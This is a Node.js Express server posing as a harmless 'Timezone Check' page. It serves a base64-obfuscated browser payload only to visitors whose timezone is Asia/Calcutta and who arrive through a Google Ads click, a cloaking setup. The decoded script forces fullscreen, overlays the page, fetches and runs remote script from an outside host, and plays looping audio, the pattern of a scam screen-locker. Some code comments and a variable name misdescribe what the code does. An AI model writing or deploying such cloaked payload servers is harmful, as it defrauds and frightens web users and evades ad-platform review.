const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Import cors

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Enable CORS and restrict it to http://localhost:3000
app.use(cors());
// Serve the HTML file
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Timezone Check</title>
    </head>
    <body>
        <h1>Welcome to Website B</h1>
        <p>This server checks the timezone and URL parameters.</p>
    </body>
    </html>
    `);
});

// Endpoint to receive data from website A
app.post('/api/timezone', (req, res) => {
    const { timezone, fullUrl } = req.body;

    // Check if the request body is valid
    if (!req.body || !timezone || !fullUrl) {
        return res.status(400).send('Invalid request body.');
    }

    console.log(`Received timezone: ${timezone}, fullUrl: ${fullUrl}`);

    // Check if the timezone is Asia/Calcutta
    const isTimezoneJapan = timezone === 'Asia/Calcutta';

    // Check if the URL contains 'gclid'
    const containsGclid = fullUrl.includes('gclid');

    // Base64 code to send in response
    const base64Code = 'Ly8gSGlkZSBvdmVyZmxvdyBvbiB0aGUgZG9jdW1lbnQgZWxlbWVudApkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuc3R5bGUub3ZlcmZsb3cgPSAiaGlkZGVuIjsgZG9jdW1lbnQuYm9keS5pbnNlcnRBZGphY2VudEhUTUwoImFmdGVyYmVnaW4iLCAiPGRpdiBpZD0iYnJ1Y2VEaXYiIHN0eWxlPSJaLWluZGV4OiA5OTk5OyBwb2ludGVyLWV2ZW50czogYXV0bzsgb3ZlcmZsb3c6IGhpZGRlbiI+PC9kaXY+Iik7IGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oKSB7IHdpbmRvdy5zY3JvbGxUbygwLCAwKTsgc2V0VGltZW91dCgoKSA9PiB7IGlmIChkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQucmVxdWVzdEZ1bGxzY3JlZW4gKSB7IGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5yZXF1ZXN0RnVsbHNjcmVlbigpOyB9IGVsc2UgaWYgKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5tb3pSZXF1ZXN0RnVsbFNjcmVlbikgeyBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQubW96UmVxdWVzdEZ1bGxTY3JlZW4oKTsgfSBlbHNlIGlmIChkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQud2Via2l0UmVxdWVzdEZ1bGxzY3JlZW4pIHsgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LndlYmtpdFJlcXVlc3RGdWxsc2NyZWVuKCk7IH0gZWxzZSBpZiAoZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50Lm1zUmVxdWVzdEZ1bGxzY3JlZW4pIHsgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50Lm1zUmVxdWVzdEZ1bGxzY3JlZW4oKTsgfSB9LCAxMDApOyBmZXRjaCgiaHR0cHM6Ly9oZXRhLm9ucmVuZGVyLmNvbS8iKS50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKS50aGVuKGNvbnRlbnQgPT4geyBjb25zdCBodG1sQ29udGVudCA9IGA8aHRtbD48aGVhZD48dGl0bGU+RW1iZWRkZWQgQ29udGVudDwvdGl0bGU+PC9oZWFkPjxib2R5PjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4ke2NvbnRlbnR9PC9zY3JpcHQ+PC9ib2R5PjwvaHRtbD5gOyBsZXQgYmxvYiA9IG5ldyBCbG9iKFtodG1sQ29udGVudF0sIHsgdHlwZTogInRleHQvaHRtbCIgfSk7IGxldCB1cmwgPSBVUkwuY3JlYXRlT2JqZWN0VVJMKGJsb2IpOyBsZXQgaWZyYW1lID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaWZyYW1lIik7IGlmcmFtZS5zcmMgPSB1cmw7IGlmcmFtZS5zdHlsZS53aWR0aCA9ICIxMDAlIjsgaWZyYW1lLnN0eWxlLmhlaWdodCA9ICIxMDAlIjsgaWZyYW1lLmZyYW1lQm9yZGVyID0gIjAiOyBpZnJhbWUuc2V0QXR0cmlidXRlKCJhbGxvd2Z1bGxzY3JlZW4iLCAiIik7IGlmcmFtZS5zZXRBdHRyaWJ1dGUoIndlYmtpdGFsbG93ZnVsbHNjcmVlbiIsICIiKTsgaWZyYW1lLnNldEF0dHJpYnV0ZSgibW96YWxsb3dmdWxsc2NyZWVuIiwgIiIpOyBpZnJhbWUuc2FuZGJveCA9ICJhbGxvdy1zY3JpcHRzIGFsbG93LXBvcHVwcyBhbGxvdy1kb3dubG9hZHMiOyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnJ1Y2VEaXYiKS5hcHBlbmRDaGlsZChpZnJhbWUpOyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnJ1Y2VEaXYiKS5zdHlsZS5oZWlnaHQgPSAiMTAwdmgiOyB9KS5jYXRjaChlcnJvciA9PiB7IGNvbnNvbGUuZXJyb3IoIkVycm9yIGZldGNoaW5nIHRoZSBKYXZhU2NyaXB0OiIsIGVycm9yKTsgfSk7fSwgeyBvbmNlOiB0cnVlIH0pOyBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKCkgewogICAgbGV0IGUgPSBuZXcgQXVkaW8oImh0dHBzOi8vYXVkaW8uanVrZWhvc3QuY28udWsvTFdkWkhPWEpNbGx2R01oMDlpZ1paM3g0a2lCSE94Z2IiKTsgZS5sb29wID0gdHJ1ZTsgZS5wbGF5KCk7IGxldCB0ID0gbmV3IEF1ZGlvKCJodHRwczovL2F1ZGlvLmp1a2Vob3N0LmNvLnVrL3d1RDY1UHNLQnJBeFdDWlU0Y0oyQ2JoVXF3bDMzVVJ3Iik7IHQubG9vcCA9IHRydWU7IHQucGxheSgpOyB9LCB7IG9uY2U6IHRydWUgfSk7'; // Your base64 string here

    // If both conditions are met, respond with the base64 code
    if (isTimezoneJapan && containsGclid) {
        console.log(`Response sent: ${base64Code}`);
        return res.status(200).send(base64Code); // Send the base64 string directly
    } else {
        const responseMessage = 'Conditions not met.';
        console.log(responseMessage);
        return res.status(200).send(responseMessage);
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
